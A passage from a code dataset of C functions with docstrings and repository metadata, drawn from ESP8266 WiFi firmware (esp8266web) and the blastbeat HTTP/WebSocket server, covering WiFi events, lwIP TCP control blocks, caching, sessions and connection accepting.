%d\\n\",\n\t\t\t\t\tevt->event_info.connected.ssid,\n\t\t\t\t\tevt->event_info.connected.channel);\n#endif\n\t\t\tstation_reconnect_off();\n\t\t\tbreak;\n\t\t}\n\t\tcase EVENT_STAMODE_DISCONNECTED:\n\t\t{\n\t\t\tst_reconn_count++;\n#ifdef PRINT_EVENT_REASON_ENABLE\n\t\t\tos_printf(\"Disconnect from ssid %s, reason(%d): \", evt->event_info.disconnected.ssid, evt->event_info.disconnected.reason);\n\t\t\tprint_event_reason(evt->event_info.disconnected.reason);\n\t\t\tos_printf(\", count %d\\n\", st_reconn_count);\n#else\n#if DEBUGSOO > 1\n\t\t\tos_printf(\"Disconnect from ssid %s, reason %d, count %d\\n\",\n\t\t\t\t\tevt->event_info.disconnected.ssid,\n\t\t\t\t\tevt->event_info.disconnected.reason, st_reconn_count);\n#endif\n#endif // PRINT_EVENT_REASON_ENABLE\n\t\t\tint opmode = wifi_get_opmode();\n\t\t\tif(wificonfig.st.reconn_timeout != 1\n\t\t\t && st_reconn_count >= COUNT_RESCONN_ST\n\t\t\t && (opmode & STATION_MODE) ) {\n\t\t\t\tif(wifi_station_get_auto_connect() != 0)\t{\n\t\t\t\t\twifi_station_disconnect();\n\t\t\t\t\tif(wificonfig.st.reconn_timeout > 1) {\n#if DEBUGSOO > 1\n\t\t\t\t\t\tos_printf(\"Set reconnect after %d sec\\n\", wificonfig.st.reconn_timeout);\n#endif\n\t\t\t\t\t\tets_timer_disarm(&st_disconn_timer);\n\t\t\t\t\t\tos_timer_setfn(&st_disconn_timer, (os_timer_func_t *)station_connect_timer, NULL);\n\t\t\t\t\t\tets_timer_arm_new(&st_disconn_timer, wificonfig.st.reconn_timeout * 1000, 0, 1);\n\t\t\t\t\t}\n#if DEBUGSOO > 1\n\t\t\t\t\telse {\n\t\t\t\t\t\tos_printf(\"Reconnect off\\n\");\n\t\t\t\t\t}\n#endif\n\t\t\t\t\tif(opmode == STATION_MODE) {\n\t\t\t\t\t\tif(wificonfig.b.sleep != LIGHT_SLEEP_T)\tWiFi_go_to_sleep(MODEM_SLEEP_T, 0xFFFFFFFF);\n\t\t\t\t\t\telse WiFi_go_to_sleep(LIGHT_SLEEP_T, wificonfig.st.reconn_timeout * 1000000);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(wifi_softap_get_station_num() == 0) { // Number count of stations which connected to ESP8266 soft-AP\n\t\t\t\tclose_all_service();\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase EVENT_STAMODE_AUTHMODE_CHANGE:\n\t\t{\n\t\t\tstation_reconnect_off();\n#if DEBUGSOO > 1\n\t\t\tos_printf(\"New AuthMode: %d -> %d\\n\",\n\t\t\t\t\tevt->event_info.auth_change.old_mode,\n\t\t\t\t\tevt->event_info.auth_change.new_mode);\n#endif\n\t\t\tbreak;\n\t\t}\n\t\tcase EVENT_STAMODE_GOT_IP:\n\t\t{\n\t\t\tstation_reconnect_off();\n#if DEBUGSOO > 1\n\t\t\tos_printf(\"Station ip:\" IPSTR \", mask:\" IPSTR \", gw:\" IPSTR \"\\n\",\n\t\t\t\t\tIP2STR(&evt->event_info.got_ip.ip),\n\t\t\t\t\tIP2STR(&evt->event_info.got_ip.mask),\n\t\t\t\t\tIP2STR(&evt->event_info.got_ip.gw));\n#endif\n\t\t\t\topen_all_service((wifi_softap_get_station_num() == 0)? 0: 1);\n\t\t\tbreak;\n\t\t}\n\t\tcase EVENT_SOFTAPMODE_STACONNECTED:\n\t\t{\n\t\t\tint i = wifi_softap_get_station_num(); // Number count of stations which connected to ESP8266 soft-AP\n\t\t\tint cs = wifi_station_get_connect_status();\n#if DEBUGSOO > 1\n\t\t\tos_printf(\"Station[%u]: \" MACSTR \" join, AID = %d, %u\\n\",\n\t\t\t\t\ti,\n\t\t\t\t\tMAC2STR(evt->event_info.sta_connected.mac),\n\t\t\t\t\tevt->event_info.sta_connected.aid, cs);\n#endif\n\t\t\topen_all_service((i == 1 && (!(cs == STATION_GOT_IP || cs == STATION_CONNECTING)))? 0 : 1);\n#ifdef USE_CAPTDNS\n\t\t\tif(syscfg.cfg.b.cdns_ena) {\n\t\t\t\t\tcaptdns_init();\n\t\t\t}\n#endif\n\t\t\tbreak;\n\t\t}\n\t\tcase EVENT_SOFTAPMODE_STADISCONNECTED:\n\t\t{\n\t\t\tint i = wifi_softap_get_station_num(); // Number count of stations which connected to ESP8266 soft-AP\n\t\t\tint cs = wifi_station_get_connect_status();\n#if DEBUGSOO > 1\n\t\t\tos_printf(\"Station[%u]: \" MACSTR \" leave, AID = %d, %u\\n\",\n\t\t\t\t\ti,\n\t\t\t\t\tMAC2STR(evt->event_info.sta_disconnected.mac),\n\t\t\t\t\tevt->event_info.sta_disconnected.aid, cs);\n#endif\n\t\t\tif(i == 0) {\n#ifdef USE_CAPTDNS\n\t\t\t\tcaptdns_close();\n#endif\n\t\t\t\tif(!(cs == STATION_CONNECTING || cs == STATION_GOT_IP)) {\n\t\t\t\t\tclose_all_service();\n\t\t\t\t\tif(st_reconn_flg != 0) {\n\t\t\t\t\t\tif((wifi_get_opmode() & STATION_MODE) && wifi_station_get_auto_connect() != 0) {\n\t\t\t\t\t\t\tstation_reconnect_off();\n#if DEBUGSOO > 1\n\t\t\t\t\t\t\tos_printf(\"New connect ST...\\n\");\n#endif\n\t\t\t\t\t\t\twifi_station_connect();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n#if DEBUGSOO > 1\n\t\tcase EVENT_STAMODE_DHCP_TIMEOUT:\n\t\t\tos_printf(\"DHCP timeot\\n\");\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tos_printf(\"?\\n\");\n\t\t\tbreak;\n#endif\n\t\t}\n}", "path": "app\\web\\wifi_events.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Purges the PCB and removes it from a PCB list. Any delayed ACKs are sent first.\n *\n * @param pcblist PCB list to purge.\n * @param pcb tcp_pcb to purge. The pcb itself is NOT deallocated!\n */\n", "func_signal": "void\ntcp_pcb_remove(struct tcp_pcb **pcblist, struct tcp_pcb *pcb)", "code": "{\n  TCP_RMV(pcblist, pcb);\n\n  tcp_pcb_purge(pcb);\n  \n  /* if there is an outstanding delayed ACKs, send it */\n  if (pcb->state != TIME_WAIT &&\n     pcb->state != LISTEN &&\n     pcb->flags & TF_ACK_DELAY) {\n    pcb->flags |= TF_ACK_NOW;\n    tcp_output(pcb);\n  }\n\n  if (pcb->state != LISTEN) {\n    LWIP_ASSERT(\"unsent segments leaking\", pcb->unsent == NULL);\n    LWIP_ASSERT(\"unacked segments leaking\", pcb->unacked == NULL);\n#if TCP_QUEUE_OOSEQ\n    LWIP_ASSERT(\"ooseq segments leaking\", pcb->ooseq == NULL);\n#endif /* TCP_QUEUE_OOSEQ */\n  }\n\n  pcb->state = CLOSED;\n\n  LWIP_ASSERT(\"tcp_pcb_remove: tcp_pcbs_sane()\", tcp_pcbs_sane());\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Allocate a new tcp_pcb structure.\n *\ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffdTCP\ufffd\ufffd\ufffd\u01bf\ufffd\u1e79\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05b6\ufffd\n * @param prio priority for the new pcb\t \t\t\t\t\ufffd\u00bf\ufffd\ufffd\u01bf\ufffd\ufffd\ufffd\ufffd\ufffd\u023c\ufffd\n * @return a new tcp_pcb that initially is in state CLOSED\t\u05b8\ufffd\ufffd\ufffd\u00bf\ufffd\ufffd\u01bf\ufffd\ufffd\u05b8\ufffd\ufffd\n */\n", "func_signal": "struct tcp_pcb *\ntcp_alloc(u8_t prio)", "code": "{\n  struct tcp_pcb *pcb;\n  u32_t iss;\n  \n  pcb = (struct tcp_pcb *)memp_malloc(MEMP_TCP_PCB);//\ufffd\ufffd\ufffd\ufffd\ufffd\u06b4\ufffd\u063f\u057c\ufffd\n  if (pcb == NULL) {\n\t//os_printf(\"tcp_pcb memory is fail\\n\");\n\t/* Try killing oldest connection in TIME-WAIT. */\n    LWIP_DEBUGF(TCP_DEBUG, (\"tcp_alloc: killing off oldest TIME-WAIT connection\\n\"));\n    tcp_kill_timewait();\n    /* Try to allocate a tcp_pcb again. */\n    pcb = (struct tcp_pcb *)memp_malloc(MEMP_TCP_PCB);\n    if (pcb == NULL) {\n      /* Try killing active connections with lower priority than the new one. */\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_alloc: killing connection with prio lower than %d\\n\", prio));\n      tcp_kill_prio(prio);\n      /* Try to allocate a tcp_pcb again. */\n      pcb = (struct tcp_pcb *)memp_malloc(MEMP_TCP_PCB);\n      if (pcb != NULL) {\n        /* adjust err stats: memp_malloc failed twice before */\n        MEMP_STATS_DEC(err, MEMP_TCP_PCB);\n      }\n    }\n    if (pcb != NULL) {\n      /* adjust err stats: timewait PCB was freed above */\n      MEMP_STATS_DEC(err, MEMP_TCP_PCB);\n    }\n  }\n  if (pcb != NULL) {\n    os_memset(pcb, 0, sizeof(struct tcp_pcb));\t\t\t\t\t\t//\ufffd\ufffd0\n    pcb->prio = prio;\t\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u023c\ufffd\n    pcb->snd_buf = TCP_SND_BUF;\t\t\t\t\t\t\t//\ufffd\ufffd\u02b9\ufffd\u00f5\u0137\ufffd\ufffd\u037b\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0421\n    pcb->snd_queuelen = 0;\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u057c\ufffd\u00f5\ufffdpbuf\ufffd\ufffd\ufffd\ufffd\n    pcb->rcv_wnd = TCP_WND;\t\t\t\t\t\t\t\t//\ufffd\ufffd\ufffd\u0574\ufffd\ufffd\ufffd\n    pcb->rcv_ann_wnd = TCP_WND;\t\t\t\t\t\t\t//\u0368\ufffd\ufffd\ufffd\ufffd\u0574\ufffd\ufffd\ufffd\n    pcb->tos = 0;\t\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n    pcb->ttl = TCP_TTL;\t\t\t\t\t\t\t\t\t\t//ttl\ufffd\u05b6\ufffd\n    /* As initial send MSS, we use TCP_MSS but limit it to 536.\n       The send MSS is updated when an MSS option is received. */\n    pcb->mss = (TCP_MSS > 536) ? 536 : TCP_MSS;\t\t\t\t//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0136\ufffd\n    pcb->rto = 1000 / TCP_SLOW_INTERVAL;\t\t\t\t\t//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\u02b1\u02b1\ufffd\ufffd\n    pcb->sa = 0;\t\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffdRTT\ufffd\ufffd\u0635\u0132\ufffd\ufffd\ufffd\n    pcb->sv = 1000 / TCP_SLOW_INTERVAL;\n    pcb->rtime = -1;\n    pcb->cwnd = 1;\t\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n    iss = tcp_next_iss();\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\u00f3\ufffd\u02bc\ufffd\ufffd\ufffd\u043a\ufffd\n    pcb->snd_wl2 = iss;\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\ufffd\u0374\ufffd\ufffd\u06b8\ufffd\ufffd\ufffd\ufffd\u05b6\ufffd\n    pcb->snd_nxt = iss;\n    pcb->lastack = iss;\n    pcb->snd_lbb = iss;   \n    pcb->tmr = tcp_ticks;\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\u00bc\ufffd\ufffd\ufffd\u01bf\u9d34\ufffd\ufffd\u03f5\u0373\u02b1\ufffd\ufffd\n\n    pcb->polltmr = 0;\t\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00bc\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd\n\n#if LWIP_CALLBACK_API\n    pcb->recv = tcp_recv_null;\t\t\t\t\t\t\t\t//\u05e2\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0775\ufffd\u012c\ufffd\ufffd\ufffd\u03f2\u3eaf\ufffd\ufffd\n#endif /* LWIP_CALLBACK_API */  \n    \n    /* Init KEEPALIVE timer */\n    pcb->keep_idle  = TCP_KEEPIDLE_DEFAULT;\n    \n#if LWIP_TCP_KEEPALIVE\n    pcb->keep_intvl = TCP_KEEPINTVL_DEFAULT;\n    pcb->keep_cnt   = TCP_KEEPCNT_DEFAULT;\n#endif /* LWIP_TCP_KEEPALIVE */\n\n    pcb->keep_cnt_sent = 0;\t\t\t\t\t\t\t\t\t//\ufffd\ufffd\ufffd\u0137\ufffd\ufffd\u0374\ufffd\ufffd\ufffd\n  }\n  return pcb;\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/******************************************************************************\n * FunctionName : open_all_service\n * if flg = 1 -> reopen\n ******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR open_all_service(int flg)", "code": "{\n#if DEBUGSOO > 3\n\tos_printf(\"Open all (%u,%u):\\n\", flg, flg_open_all_service);\n#endif\n#ifdef USE_TCP2UART\n\tif(tcp2uart_servcfg == NULL) tcp2uart_start(syscfg.tcp2uart_port);\n#endif\n#ifdef USE_MODBUS\n\tif(mdb_tcp_servcfg == NULL) mdb_tcp_start(syscfg.mdb_port);\n#endif\n#ifdef USE_SNTP\n\tif(syscfg.cfg.b.sntp_ena && get_sntp_time() == 0) sntp_inits();\n#endif\n\tif(flg == 0 || flg_open_all_service == false) {\n#ifdef USE_WEB\n\t    if(syscfg.web_port) {\n\t    \tTCP_SERV_CFG *p = tcpsrv_server_port2pcfg(syscfg.web_port);\n\t    \tif(p != NULL) {\n\t    \t\tif(p->port != syscfg.web_port) {\n\t    \t\t\ttcpsrv_close(p);\n\t    \t\t\tp = NULL;\n\t    \t\t}\n\t    \t}\n\t    \tif(p == NULL) {\n\t    \t\twebserver_init(syscfg.web_port);\n\t    \t}\n\t    }\n#endif\n#ifdef USE_NETBIOS\n\t    if(syscfg.cfg.b.netbios_ena) netbios_init();\n#endif\n\t}\n    flg_open_all_service = true;\n}", "path": "app\\web\\wifi_events.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/******************************************************************************\n * FunctionName : station_reconnect_off\n ******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR station_reconnect_off(void)", "code": "{\n\tst_reconn_count = 0;\n\tst_reconn_flg = 0;\n\tets_timer_disarm(&st_disconn_timer);\n}", "path": "app\\web\\wifi_events.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "// forward to peers (destination is checked on add)\n// TODO is copy required for all peers ?\n", "func_signal": "static void bb_pipe_websocket_to(struct bb_pipe *bbp, char *buf, size_t len)", "code": "{\n\t// forward to a sid;\n\tif (bbp->dest[0] == '@') {\n\t\tstruct bb_session *bbs = bb_sht_get(bbp->dest+1);\n\t\tif (!bbs) return;\n\t\t(void) bb_websocket_reply(bbs, buf, len);\n\t\treturn;\n\t}\n\n\tstruct bb_group *bbg = bb_ght_get(bbp->session->vhost, bbp->dest, bbp->dest_len);\n\tif (!bbg) return;\n\tstruct bb_group_session *bbgs = bbg->sessions;\n        while(bbgs) {\n\t\tif (bbgs->session == bbp->session && bbgs->noecho) goto next;\n\t\t(void) bb_websocket_reply(bbgs->session, buf, len);\nnext:\n        \tbbgs = bbgs->next;\n\t}\n}", "path": "src\\pipe.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// each session has a request structure, this strcture can be cleared multiple times\n", "func_signal": "void bb_initialize_request(struct bb_session *bbs)", "code": "{\n\tsize_t i;\n\t// free already used resources\n\tif (bbs->request.initialized) {\n\t\tif (bbs->request.uwsgi_buf) {\n\t\t\tbb_free(bbs->request.uwsgi_buf, bbs->request.uwsgi_len);\n\t\t}\n\t\tif (bbs->request.websocket_message_queue) {\n\t\t\tbb_free(bbs->request.websocket_message_queue, bbs->request.websocket_message_queue_len);\n\t\t}\n\n\t\tif (bbs->request.url)\n\t\t\tbb_free(bbs->request.url, bbs->request.url_len);\n\n\t\tfor(i=0;i<bbs->request.headers_count;i++) {\n\t\t\tif (bbs->request.headers[i].key)\n\t\t\t\tbb_free(bbs->request.headers[i].key, bbs->request.headers[i].keylen);\n\t\t\tif (bbs->request.headers[i].value)\n\t\t\t\tbb_free(bbs->request.headers[i].value, bbs->request.headers[i].vallen);\n\t\t}\n\t\tif (bbs->request.headers)\n\t\t\tbb_free(bbs->request.headers, sizeof(struct bb_http_header)*bbs->request.headers_count);\n\t\t// clear all\n\t\tmemset(&bbs->request, 0, sizeof(struct bb_request));\n\t}\n\n\thttp_parser_init(&bbs->request.parser, HTTP_REQUEST);\n\tbbs->request.parser.data = bbs;\n\tbbs->request.last_was_value = 1;\n\n\tbbs->request.initialized = 1;\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/* Does the parser need to see an EOF to find the end of the message? */\n", "func_signal": "int\nhttp_message_needs_eof (const http_parser *parser)", "code": "{\n  if (parser->type == HTTP_REQUEST) {\n    return 0;\n  }\n\n  /* See RFC 2616 section 4.4 */\n  if (parser->status_code / 100 == 1 || /* 1xx e.g. Continue */\n      parser->status_code == 204 ||     /* No Content */\n      parser->status_code == 304 ||     /* Not Modified */\n      parser->flags & F_SKIPBODY) {     /* response to a HEAD request */\n    return 0;\n  }\n\n  if ((parser->flags & F_CHUNKED) || parser->content_length != ULLONG_MAX) {\n    return 0;\n  }\n\n  return 1;\n}", "path": "http-parser\\http_parser.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*\nhere we run 2 parsers:\n\nthe first one will split options\n\nkey expires flags\\r\\n\n\nif key is right and the body is present (an empty body, means: destroy the item)\nthe second one will run a http parser, if it is valid the cache_item is added to the hashtable\n\n*/\n", "func_signal": "void bb_cache_store(struct bb_session *bbs, char *buf, size_t len, int frag)", "code": "{\n\tif (bbs->vhost->cache_size == 0) return;\n\n\t// check for space\n\tif (bbs->vhost->allocated_cache + (sizeof(struct bb_cache_item) + len) > bbs->vhost->cache_size) {\n\t\tfprintf(stderr,\"!!! cache for virtualhost \\\"%.*s\\\" is full !!!\\n\", (int) bbs->vhost->len, bbs->vhost->name);\n\t\treturn;\n\t}\n\n\t// 0->key 1->expires 2->flags 3->uninteresting 4->end\n\tint status = 0;\n\tuint32_t cht_pos;\n\n\tchar *key = buf;\n\tchar *expires = NULL;\n\tchar *flags = NULL;\n\tsize_t keylen = 0;\n\tsize_t expires_len = 0;\n\tsize_t flags_len = 0;\n\n\tsize_t i;\n\tfor(i=0;i<len;i++) {\n\t\tif (buf[i] == ' ') {\n\t\t\tif (status == 0) { keylen = i; status = 1; }\n\t\t\telse if (status == 1) { expires_len = i; status = 2;}\n\t\t\telse if (status == 2) { flags_len = i; status = 3;}\n\t\t}\n\t\telse if (buf[i] == '\\n') {\n\t\t\tif (status == 4) break;\n\t\t\tif (status == 0) { keylen = i; status = 1; }\n\t\t\telse if (status == 1) { expires_len = i; status = 2;}\n\t\t\telse if (status == 2) { flags_len = i; status = 3;}\n\t\t\tbreak;\n\t\t}\n\t\telse if (buf[i] == '\\r') {\n\t\t\tif (status == 4) break;\n\t\t\tif (status == 0) { keylen = i; status = 1; }\n\t\t\telse if (status == 1) { expires_len = i; status = 2;}\n\t\t\telse if (status == 2) { flags_len = i; status = 3;}\n\t\t\tstatus = 4;\n\t\t}\n\t\telse {\n\t\t\tif (status == 1 && !expires) { expires = buf+i; }\n\t\t\telse if (status == 2 && !flags) { flags = buf+i;}\n\t\t}\n\t}\n\n\tif (keylen == 0) return;\n\n\t// fix size\n\tif (expires_len > 0) {\n\t\texpires_len -= expires-buf;\n\t}\n\tif (flags_len > 0) {\n\t\tflags_len -= flags-buf;\n\t}\n\n\tuint64_t expires_num = bb_str2num(expires, expires_len);\n\tuint32_t flags_num = bb_str2num(flags, flags_len);\n\n\tstruct bb_cache_item *already = bb_cache_get(bbs->vhost, key, keylen, frag);\n\tif (already) {\n\t\t// empty body, destroy the item\n\t\tif (len-(i+1) <= 0) {\n\t\t\tbb_cache_destroy(already);\n\t\t\treturn ;\n\t\t}\n\t\t// by default ignore updates\n\t\tif (flags_num == 0) return;\n\n\t\tbb_cache_destroy(already);\n\t}\n\n\tchar *http_buf = buf+(i+1);\n\tsize_t http_buf_len = len-(i+1);\n\n\tstruct bb_cache_item *bbci = bb_alloc(sizeof(struct bb_cache_item));\n\tif (!bbci) {\n\t\treturn;\n\t}\n\tmemset(bbci, 0, sizeof(struct bb_cache_item));\n\n\tif (frag) {\n\t\tbbci->body = bb_alloc(http_buf_len);\n\t\tif (!bbci->body) {\n\t\t\tgoto clear;\n\t\t}\t\t\n\t\tmemcpy(bbci->body, http_buf, http_buf_len);\n\t\tbbci->body_len = http_buf_len;\n\t\tgoto store;\n\t}\n\n\thttp_parser parser;\n\thttp_parser_init(&parser, HTTP_RESPONSE);\n\n\tbbci->last_was_value = 1;\n\tparser.data = bbci;\n\n\tint res = http_parser_execute(&parser, &bb_http_cache_parser_settings, http_buf, http_buf_len);\n\tif (!bbci->valid && res != http_buf_len) goto clear;\n\n\tbbci->status[0] = (parser.status_code/100) + '0';\n        bbci->status[1] = ((parser.status_code%100)/10) + '0';\n        bbci->status[2] = ((parser.status_code%100)%10) + '0';\n\n\tmemcpy(bbci->protocol, http_buf, 8);\n\n\tbbci->http_first_line_len = bbci->http_end_of_first_line-http_buf;\n\tbbci->http_first_line = bb_alloc(bbci->http_first_line_len);\n\tif (!bbci->http_first_line) {\n\t\tgoto clear;\n\t}\n\tmemcpy(bbci->http_first_line, http_buf, bbci->http_first_line_len);\n\nstore:\n        // get the hash\n        cht_pos = djb2_hash_cache(key, keylen, bbs->vhost->cht_size);\n        // get the ht entry\n        struct bb_cache_entry *bbce = &bbs->vhost->cache[cht_pos];\n\n        bbci->key = bb_alloc(keylen);\n\tif (!bbci->key) {\n\t\tgoto clear;\n\t}\n\n\tmemcpy(bbci->key, key, keylen);\n        bbci->keylen = keylen;\n\tbbci->frag = frag;\n\tbbci->entry = bbce;\n        bbci->next = NULL;\n\tbbci->len = sizeof(struct bb_cache_item) + bbci->body_len + bbci->http_first_line_len + keylen + bbci->headers_len;\n\tbbci->expires_num = expires_num;\n\tbbci->vhost = bbs->vhost;\n\n        // append cache item to entry\n        if (!bbce->head) {\n                bbci->prev = NULL;\n                bbce->head = bbci;\n        }\n        else {\n                bbci->prev = bbce->tail;\n                bbce->tail->next = bbci;\n        }\n        bbce->tail = bbci;\n\n\tif (expires_num > 0) {\n        \tev_timer_init(&bbci->expires, cache_expires_cb, expires_num, 0.0);\n\t\tev_timer_start(blastbeat.loop, &bbci->expires);\n\t}\n\n\tbbs->vhost->allocated_cache += bbci->len;\n\tblastbeat.cache_memory += bbci->len;\n\t\n\treturn;\n\nclear:\n\tbb_cache_clear(bbci);\n}", "path": "src\\cache.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// get a cache item\n", "func_signal": "struct bb_cache_item *bb_cache_get(struct bb_virtualhost *vhost, char *name, size_t len, int frag)", "code": "{\n\n        uint32_t cht_pos = djb2_hash_cache(name, len, vhost->cht_size);\n        struct bb_cache_entry *bbce = &vhost->cache[cht_pos];\n        struct bb_cache_item *bbci = bbce->head;\n        while(bbci) {\n                if (bb_cache_compare(bbci, name, len, frag)) {\n                        return bbci;\n                }\n                bbci = bbci->next;\n        };\n        return NULL;\n}", "path": "src\\cache.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// allocate a new session\n", "func_signal": "struct bb_session *bb_session_new(struct bb_connection *bbc)", "code": "{\n\tif (blastbeat.active_sessions+1 > blastbeat.max_sessions) {\n\t\tfprintf(stderr,\"!!! maximum number of total sessions (%llu) reached !!!\\n\", (unsigned long long) blastbeat.max_sessions);\n\t\treturn NULL;\n\t}\n\tstruct bb_session *bbs = bb_alloc(sizeof(struct bb_session));\n\tif (!bbs) {\n\t\treturn NULL;\n\t}\n\tmemset(bbs, 0, sizeof(struct bb_session));\n\t// put the session in the hashtable\n\tbb_sht_add(bbs);\n\t// link to the connection\n\tbbs->connection = bbc;\n\tif (!bbc->sessions_head) {\n\t\tbbc->sessions_head = bbs;\n\t\tbbc->sessions_tail = bbs;\n\t}\n\telse {\n\t\tbbs->conn_prev = bbc->sessions_tail;\n\t\tbbc->sessions_tail = bbs;\n\t\tbbs->conn_prev->next = bbs;\n\t}\n\n\t// by default set the HTTP hooks\n\tbbs->send_headers = bb_http_send_headers;\n\tbbs->send_end = bb_http_send_end;\n\tbbs->send_body = bb_http_send_body;\n\tbbs->recv_body = bb_http_recv_body;\n\tbbs->send_cache_headers = bb_http_cache_send_headers;\n\tbbs->send_cache_body = bb_http_cache_send_body;\n\n\tev_timer_init(&bbs->death_timer, session_timer_cb, 0.0, 0.0);\n\n\tblastbeat.active_sessions++;\n\treturn bbs;\n}", "path": "src\\main.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*\n\nsocket.io management\n\n/socket.io/1/ -> send handshake response using the bb sid, mark the sid as persistent (generate a uwsgi message)\n\n/socket.io/1/xhr-polling/<sid> -> (check the sid if configured as persistent)\n\tGET -> dequeue a message from the poller queue, or wait upto 30 seconds before responsding with an empty message\n\tPOST -> add a message to the queue, if already polling, feed a TIMER_EVENT\n\n/socket.io/1/websocket/<sid> -> (check the sid if configured as persistent)\nparse each websocket message twice (one for websocket and one for socket.io format) and generate\nthe socket.io/type message\n\n*/\n", "func_signal": "static char *find_third_colon(char *buf, size_t len)", "code": "{\n        size_t i;\n        int count = 0;\n        for(i=0;i<len;i++) {\n                if (buf[i] == ':') {\n                        count++;\n                        if (count == 3) {\n                                if ((i+1) > (len-1)) return NULL;\n                                return buf+i+1;\n                        }\n                }\n        }\n        return NULL;\n}", "path": "src\\socketio.c", "repo_name": "unbit/blastbeat", "stars": 159, "license": "mit", "language": "c", "size": 393}
{"docstring": "// this callback create a new connection object\n", "func_signal": "static void bb_accept_callback(struct ev_loop *loop, struct ev_io *w, int revents)", "code": "{\n\tstruct bb_acceptor *acceptor = (struct bb_acceptor *) w;\n\tunion bb_addr addr;\n\tsocklen_t sin_len = acceptor->addr_len;\n\tint client = accept(w->fd, (struct sockaddr *)&addr, &sin_len);\n\tif (client < 0) {\n\t\tperror(\"accept()\");\n\t\treturn;\n\t}\n\n\tif (bb_nonblock(client)) {\n\t\tclose(client);\n\t\treturn;\n\t}\n\n\t// generate a new connection object\n\tstruct bb_connection *bbc = bb_alloc(sizeof(struct bb_connection));\n\tif (!bbc) {\n\t\tclose(client);\n\t\treturn;\n\t}\n\tmemset(bbc, 0, sizeof(struct bb_connection));\n\n\t// copy the address structure\n\tmemcpy(&bbc->addr, &addr, sizeof(union bb_addr));\n\n\tchar *addr_ptr = (char *) &addr.in4.sin_addr.s_addr;\n\tif (addr.in.sa_family == AF_INET6) {\n\t\taddr_ptr = (char *) &addr.in6.sin6_addr.s6_addr;\n\t}\n\n\tif (!inet_ntop(addr.in.sa_family, addr_ptr, bbc->addr_str, INET6_ADDRSTRLEN)) {\n\t\tbb_error(\"ntop()\");\n\t}\n\n\t// we could use the same address for ipv4 and ipv6\n\tif (snprintf(bbc->addr_port, 6, \"%u\", addr.in4.sin_port) < 1) {\n\t\tfprintf(stderr,\"unable to get client port\\n\");\n\t}\n\n\t// for performance\n\tbbc->addr_str_len = strlen(bbc->addr_str);\n\tbbc->addr_port_len = strlen(bbc->addr_port);\n\n\tbbc->fd = client;\n\tbbc->acceptor = acceptor;\n\t// ssl context ?\n\tif (bbc->acceptor->ctx) {\n\t\tbbc->ssl = SSL_new(acceptor->ctx);\n\t\tSSL_set_ex_data(bbc->ssl, blastbeat.ssl_index, bbc);\n\t\tSSL_set_fd(bbc->ssl, bbc->fd);\n\t\tSSL_set_accept_state(bbc->ssl);\n\t}\n\t// set the HTTP parser by default\n\tbbc->func = bb_http_func;\n\n\tev_io_init(&bbc->reader.reader, bb_rd_callback, client, EV_READ);\n\tbbc->reader.connection = bbc;\n\tev_io_init(&bbc->writer.writer, bb_wq_callback, client, EV_WRITE);\n\tbbc->writer.connection = bbc;\n\n\t// prepare the throttle hook\n\tev_prepare_init(&bbc->throttle.throttle, bb_connection_throttle_cb);\n\n\t// prepare a low level connection timeout\n\tev_timer_init(&bbc->timeout, connection_timer_cb, 0.0, 0.0);\n\t// set the deafult timeout\n\tbbc->timeout_value = blastbeat.timeout;\n\n\tblastbeat.active_connections++;\n\n\tev_io_start(loop, 